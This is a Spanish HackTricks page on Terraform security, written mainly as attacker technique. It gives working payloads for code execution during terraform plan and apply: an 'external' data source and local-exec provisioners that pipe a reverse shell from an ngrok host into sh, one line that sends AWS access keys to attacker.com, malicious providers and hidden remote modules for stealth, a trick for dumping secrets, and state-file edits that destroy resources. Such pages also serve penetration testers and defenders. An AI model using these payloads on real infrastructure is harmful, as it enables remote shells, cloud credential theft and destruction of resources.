# Seguridad de Terraform

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci칩n B치sica

[Desde la documentaci칩n:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform es una herramienta de **infraestructura como c칩digo** que te permite definir tanto **recursos en la nube como locales** en archivos de configuraci칩n legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes utilizar un flujo de trabajo consistente para aprovisionar y gestionar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede gestionar componentes de bajo nivel como computaci칩n, almacenamiento y recursos de red, as칤 como componentes de alto nivel como entradas DNS y caracter칤sticas de SaaS.

### 쮺칩mo funciona Terraform?

Terraform crea y gestiona recursos en plataformas en la nube y otros servicios a trav칠s de sus interfaces de programaci칩n de aplicaciones (APIs). Los proveedores permiten que Terraform funcione con pr치cticamente cualquier plataforma o servicio con una API accesible.

![](<../.gitbook/assets/image (177).png>)

HashiCorp y la comunidad de Terraform ya han escrito **m치s de 1700 proveedores** para gestionar miles de tipos diferentes de recursos y servicios, y este n칰mero sigue creciendo. Puedes encontrar todos los proveedores p칰blicamente disponibles en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, y muchos m치s.

El flujo de trabajo central de Terraform consta de tres etapas:

* **Escribir:** Defines recursos, que pueden estar en m칰ltiples proveedores de nube y servicios. Por ejemplo, podr칤as crear una configuraci칩n para implementar una aplicaci칩n en m치quinas virtuales en una red de VPC con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecuci칩n describiendo la infraestructura que crear치, actualizar치 o destruir치 basado en la infraestructura existente y tu configuraci칩n.
* **Aplicar:** Con la aprobaci칩n, Terraform realiza las operaciones propuestas en el orden correcto, respetando las dependencias de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el n칰mero de m치quinas virtuales en esa VPC, Terraform recrear치 la VPC antes de escalar las m치quinas virtuales.

![](<../.gitbook/assets/image (215).png>)

## Laboratorio de Terraform

Simplemente instala terraform en tu computadora.

Aqu칤 tienes una [gu칤a](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aqu칤 tienes la [mejor forma de descargar terraform](https://www.terraform.io/downloads).

## RCE en Terraform

Terraform **no tiene una plataforma que exponga una p치gina web o un servicio de red** que podamos enumerar, por lo tanto, la 칰nica forma de comprometer terraform es **ser capaz de agregar/modificar archivos de configuraci칩n de terraform**.

Sin embargo, terraform es un **componente muy sensible** para comprometer porque tendr치 **acceso privilegiado** a diferentes ubicaciones para poder funcionar correctamente.

La principal forma para que un atacante pueda comprometer el sistema donde se est치 ejecutando terraform es **comprometer el repositorio que almacena las configuraciones de terraform**, porque en alg칰n momento van a ser **interpretadas**.

De hecho, existen soluciones que **ejecutan autom치ticamente terraform plan/apply despu칠s de que se crea un PR**, como **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Si eres capaz de comprometer un archivo de terraform, hay diferentes formas en las que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan es el **comando m치s utilizado** en terraform y los desarrolladores/soluciones que utilizan terraform lo llaman todo el tiempo, por lo que la **forma m치s f치cil de obtener RCE** es asegurarse de envenenar un archivo de configuraci칩n de terraform que ejecutar치 comandos arbitrarios en un `terraform plan`.

#### Usando un proveedor externo

Terraform ofrece el proveedor [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que proporciona una forma de interfaz entre Terraform y programas externos. Puedes usar el origen de datos `external` para ejecutar c칩digo arbitrario durante un `plan`.

Inyectar en un archivo de configuraci칩n de terraform algo como lo siguiente ejecutar치 un shell reverso cuando se ejecute `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Usando un proveedor personalizado

Un atacante podr칤a enviar un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) al [Registro de Terraform](https://registry.terraform.io/) y luego agregarlo al c칩digo de Terraform en una rama de caracter칤sticas ([ejemplo de aqu칤](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
El proveedor se descarga en el `init` y ejecutar치 el c칩digo malicioso cuando se ejecute `plan`.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando una referencia externa

Ambas opciones mencionadas son 칰tiles pero no muy sigilosas (la segunda es m치s sigilosa pero m치s compleja que la primera). Puedes realizar este ataque de una manera a칰n **m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el rev shell directamente en el archivo de terraform, puedes **cargar un recurso externo** que contenga el rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puedes encontrar el c칩digo de rev shell en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, usa la caracter칤stica **ref** para ocultar el **c칩digo de rev shell de Terraform en una rama** dentro del repositorio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Aplicar Terraform

Se ejecutar치 Terraform apply para aplicar todos los cambios, tambi칠n puedes abusar de 칠l para obtener RCE inyectando **un archivo de Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesitas asegurarte de que alg칰n payload como los siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la t칠cnica anterior** para realizar este ataque de una manera **m치s sigilosa utilizando referencias externas**.

## Volcados de Secretos

Puedes tener **valores secretos utilizados por terraform volcados** ejecutando `terraform apply` agregando al archivo de terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abuso de Archivos de Estado de Terraform

En caso de que tengas acceso de escritura sobre los archivos de estado de Terraform pero no puedas cambiar el c칩digo de Terraform, [**esta investigaci칩n**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) ofrece algunas opciones interesantes para aprovechar el archivo:

### Eliminaci칩n de recursos <a href="#deleting-resources" id="deleting-resources"></a>

Existen 2 formas de destruir recursos:

1. **Insertar un recurso con un nombre aleatorio en el archivo de estado apuntando al recurso real a destruir**

Debido a que Terraform ver치 que el recurso no deber칤a existir, lo destruir치 (siguiendo el ID del recurso real indicado). Ejemplo de la p치gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modificar el recurso a eliminar de manera que no sea posible actualizarlo (por lo que se eliminar치 y se recrear치)**

Para una instancia EC2, modificar el tipo de instancia es suficiente para hacer que Terraform la elimine y la vuelva a crear.

### RCE

Tambi칠n es posible [crear un proveedor personalizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) y simplemente reemplazar uno de los proveedores en el archivo de estado de Terraform por el malicioso o agregar un recurso vac칤o con el proveedor malicioso. Ejemplo de la investigaci칩n original:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Herramientas de Auditor칤a

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an치lisis est치tico de tu c칩digo terraform para detectar posibles configuraciones incorrectas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de c칩digo est치tico para Infraestructura como C칩digo.

## Referencias

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
